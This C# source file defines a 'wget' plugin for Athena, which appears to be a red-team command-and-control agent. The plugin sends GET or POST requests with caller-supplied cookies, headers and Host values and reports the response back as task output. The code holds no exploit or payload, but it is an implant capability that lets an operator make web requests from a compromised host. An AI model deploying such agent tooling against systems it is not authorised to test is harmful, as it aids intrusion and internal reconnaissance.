using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.Json;
using System.Text;
using Athena.Commands.Models;
using Athena.Models;
using Athena.Commands;

namespace Plugins
{
    public class Wget : AthenaPlugin
    {
        public override string Name => "wget";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                if (args.ContainsKey("url"))
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(args["url"].ToString());

                    if (args.ContainsKey("cookies"))
                    {
                        if (!String.IsNullOrEmpty(args["cookies"]) && args["cookies"].ToString().StartsWith('{'))
                        {
                            Dictionary<string, string> cookies = JsonSerializer.Deserialize<Dictionary<string, string>>(args["cookies"]);
                            CookieContainer cc = new CookieContainer();
                            foreach (var kvp in cookies)
                            {
                                Cookie c = new Cookie(kvp.Key, kvp.Value);
                                cc.Add(c);
                            }
                            req.CookieContainer = cc;
                        }
                    }

                    if (args.ContainsKey("headers"))
                    {
                        if (!String.IsNullOrEmpty(args["headers"]) && args["headers"].ToString().StartsWith('{'))
                        {
                            Dictionary<string, string> headers = JsonSerializer.Deserialize<Dictionary<string, string>>(args["headers"]);

                            foreach (var kvp in headers)
                            {
                                if (kvp.Key.ToLower() == "host")
                                {
                                    req.Host = kvp.Value;
                                }
                                else
                                {
                                    req.Headers.Add(kvp.Key, kvp.Value);
                                }
                            }
                        }
                    }

                    try
                    {
                        if (args.ContainsKey("method"))
                        {
                            switch (args["method"].ToString().ToLower())
                            {
                                case "get":
                                    TaskResponseHandler.AddResponse(new ResponseResult()
                                    {
                                        completed = true,
                                        user_output = Get(req),
                                        task_id = args["task-id"]
                                    });
                                    break;
                                case "post":
                                    if (!String.IsNullOrEmpty(args["body"]))
                                    {
                                        TaskResponseHandler.AddResponse(new ResponseResult()
                                        {
                                            completed = true,
                                            user_output = Post(req, args["body"].ToString()),
                                            task_id = args["task-id"]
                                        });
                                    }
                                    else
                                    {
                                        TaskResponseHandler.AddResponse(new ResponseResult()
                                        {
                                            completed = true,
                                            user_output = Post(req, ""),
                                            task_id = args["task-id"]
                                        });
                                    }
                                    break;
                                default:
                                    TaskResponseHandler.AddResponse(new ResponseResult()
                                    {
                                        completed = true,
                                        user_output = Get(req),
                                        task_id = args["task-id"]
                                    });
                                    break;
                            }
                        }
                        else
                        {
                            TaskResponseHandler.AddResponse(new ResponseResult()
                            {
                                completed = true,
                                user_output = Get(req),
                                task_id = args["task-id"]
                            });
                        }
                    }
                    catch (Exception e)
                    {
                        TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
                        return;
                    }

                }
                else
                {
                    TaskResponseHandler.AddResponse(new ResponseResult()
                    {
                        completed = true,
                        task_id = args["task-id"],
                        user_output = "A URL needs to be specified.",
                        status = "error"
                    });
                }
            }
            catch (Exception e)
            {
                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
                return;
            }
        }
        public string Get(HttpWebRequest req)
        {
            try
            {
                req.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

                using (HttpWebResponse response = (HttpWebResponse)req.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
        public string Post(HttpWebRequest req, string data)
        {
            try
            {
                byte[] dataBytes = Encoding.UTF8.GetBytes(data);

                req.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                req.ContentLength = dataBytes.Length;
                //req.ContentType = contentType;
                //req.Method = method;

                using (Stream requestBody = req.GetRequestStream())
                {
                    requestBody.Write(dataBytes, 0, dataBytes.Length);
                }

                using (HttpWebResponse response = (HttpWebResponse)req.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
    }
}